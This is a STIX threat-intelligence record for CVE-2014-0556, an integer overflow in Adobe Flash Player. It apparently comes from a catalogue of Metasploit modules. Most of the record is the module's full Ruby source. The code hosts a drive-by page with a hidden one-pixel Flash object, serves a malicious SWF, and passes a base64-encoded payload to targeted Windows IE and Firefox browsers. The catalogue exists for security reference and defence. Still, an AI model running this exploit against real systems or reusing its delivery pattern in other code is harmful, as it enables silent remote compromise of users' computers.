{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9532c9db-f289-42fc-ad7b-f0a480c74b39",
    "created": "2024-08-14T16:42:11.369566Z",
    "modified": "2024-08-14T16:42:11.36957Z",
    "name": "Adobe Flash Player copyPixelsToByteArray Method Integer Overflow",
    "description": " This module exploits an integer overflow in Adobe Flash Player. The vulnerability occurs in the copyPixelsToByteArray method from the BitmapData object. The position field of the destination ByteArray can be used to cause an integer overflow and write contents out of the ByteArray buffer. This module has been tested successfully on: * Windows 7 SP1 (32-bit), IE 8 to IE 11 and Flash 14.0.0.176, 14.0.0.145, and 14.0.0.125. * Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 14.0.0.179. * Windows 8.1, Firefox 38.0.5 and Adobe Flash 14.0.0.179.  'License'             => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/adobe_flash_copy_pixels_to_byte_array.rb",
            "external_id": "adobe_flash_copy_pixels_to_byte_array.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0556"
        },
        {
            "source_name": "reference",
            "url": "http://googleprojectzero.blogspot.com/2014/09/exploiting-cve-2014-0556-in-flash.html"
        },
        {
            "source_name": "reference",
            "url": "https://code.google.com/p/google-security-research/issues/detail?id=46"
        },
        {
            "source_name": "reference",
            "url": "http://hacklab.kr/cve-2014-0556-%EB%B6%84%EC%84%9D/"
        },
        {
            "source_name": "reference",
            "url": "http://malware.dontneedcoffee.com/2014/10/cve-2014-0556-adobe-flash-player.html"
        },
        {
            "source_name": "reference",
            "url": "https://helpx.adobe.com/security/products/flash-player/apsb14-21.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'                => 'Adobe Flash Player copyPixelsToByteArray Method Integer Overflow',\n      'Description'         => %q{\n        This module exploits an integer overflow in Adobe Flash Player. The vulnerability occurs\n        in the copyPixelsToByteArray method from the BitmapData object. The position field of the\n        destination ByteArray can be used to cause an integer overflow and write contents out of\n        the ByteArray buffer. This module has been tested successfully on:\n        * Windows 7 SP1 (32-bit), IE 8 to IE 11 and Flash 14.0.0.176, 14.0.0.145, and 14.0.0.125.\n        * Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 14.0.0.179.\n        * Windows 8.1, Firefox 38.0.5 and Adobe Flash 14.0.0.179.\n      },\n      'License'             => MSF_LICENSE,\n      'Author'              =>\n        [\n          'Chris Evans', # Vulnerability discovery and 64 bit analysis / exploit\n          'Nicolas Joly', # Trigger for 32 bit, according to the project zero ticket\n          'hdarwin', # @hdarwin89, 32 bit public exploit, this msf module uses it\n          'juan vazquez' # msf module\n        ],\n      'References'          =>\n        [\n          ['CVE', '2014-0556'],\n          ['OSVDB', '111110'],\n          ['URL', 'http://googleprojectzero.blogspot.com/2014/09/exploiting-cve-2014-0556-in-flash.html'],\n          ['URL', 'https://code.google.com/p/google-security-research/issues/detail?id=46'],\n          ['URL', 'http://hacklab.kr/cve-2014-0556-%EB%B6%84%EC%84%9D/'],\n          ['URL', 'http://malware.dontneedcoffee.com/2014/10/cve-2014-0556-adobe-flash-player.html'],\n          ['URL', 'https://helpx.adobe.com/security/products/flash-player/apsb14-21.html']\n        ],\n      'Payload'             =>\n        {\n          'DisableNops' => true\n        },\n      'Platform'            => 'win',\n      'BrowserRequirements' =>\n        {\n          :source  => /script|headers/i,\n          :os_name => lambda do |os|\n            os =~ OperatingSystems::Match::WINDOWS_7 ||\n              os =~ OperatingSystems::Match::WINDOWS_81\n          end,\n          :ua_name => lambda { |ua| [Msf::HttpClients::IE, Msf::HttpClients::FF].include?(ua) },\n          :flash   => lambda { |ver| ver =~ /^14\\./ && Rex::Version.new(ver) <=  Rex::Version.new('14.0.0.179') },\n          :arch    => ARCH_X86\n        },\n      'Targets'             =>\n        [\n          [ 'Automatic', {} ]\n        ],\n      'Privileged'          => false,\n      'DisclosureDate'      => '2014-09-23',\n      'DefaultTarget'       => 0))\n  end\n\n  def exploit\n    @swf = create_swf\n    super\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    print_status(\"Request: #{request.uri}\")\n\n    if request.uri =~ /\\.swf$/\n      print_status('Sending SWF...')\n      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Cache-Control' => 'no-cache, no-store', 'Pragma' => 'no-cache'})\n      return\n    end\n\n    print_status('Sending HTML...')\n    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})\n  end\n\n  def exploit_template(cli, target_info)\n    swf_random = \"#{rand_text_alpha(4 + rand(3))}.swf\"\n    target_payload = get_payload(cli, target_info)\n    b64_payload = Rex::Text.encode_base64(target_payload)\n    platform_id = 'win'\n    os_name = target_info[:os_name]\n\n    html_template = %Q|<html>\n    <body>\n    <object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab\" width=\"1\" height=\"1\" />\n    <param name=\"movie\" value=\"<%=swf_random%>\" />\n    <param name=\"allowScriptAccess\" value=\"always\" />\n    <param name=\"FlashVars\" value=\"sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>\" />\n    <param name=\"Play\" value=\"true\" />\n    <embed type=\"application/x-shockwave-flash\" width=\"1\" height=\"1\" src=\"<%=swf_random%>\" allowScriptAccess=\"always\" FlashVars=\"sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>\" Play=\"true\"/>\n    </object>\n    </body>\n    </html>\n    |\n\n    return html_template, binding()\n  end\n\n  def create_swf\n    path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2014-0556', 'msf.swf')\n    swf =  ::File.open(path, 'rb') { |f| swf = f.read }\n\n    swf\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-09-23",
    "x_mitre_platforms": [
        "win'"
    ]
}